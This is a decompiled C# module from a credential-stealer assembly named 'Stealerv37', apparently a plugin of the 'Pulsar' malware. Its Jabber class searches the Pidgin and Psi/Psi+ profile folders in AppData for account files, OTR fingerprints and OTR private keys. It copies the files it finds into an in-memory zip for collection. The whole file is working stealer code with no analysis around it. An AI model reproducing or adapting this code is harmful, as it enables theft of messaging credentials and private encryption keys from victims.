// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Jabber
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Jabber : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string[] source = new string[3]
    {
      folderPath + "\\.purple\\",
      folderPath + "\\Psi\\profiles\\default\\",
      folderPath + "\\Psi+\\profiles\\default\\"
    };
    string[] files2 = new string[4]
    {
      "accounts.xml",
      "otr.fingerprints",
      "otr.keys",
      "otr.private_key"
    };
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Jabber);
    Parallel.ForEach<string>((IEnumerable<string>) source, (Action<string>) (dir =>
    {
      if (!Directory.Exists(dir))
        return;
      Parallel.ForEach<string>((IEnumerable<string>) files2, (Action<string>) (file2 =>
      {
        if (!File.Exists(dir + file2))
          return;
        string entryPath = "Jabber\\" + file2;
        zip.AddFile(entryPath, File.ReadAllBytes(dir + file2));
        counterApplications.Files.Add($"{dir}{file2} => {entryPath}");
      }));
    }));
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Jabber\\");
    counter.Messangers.Add(counterApplications);
  }
}
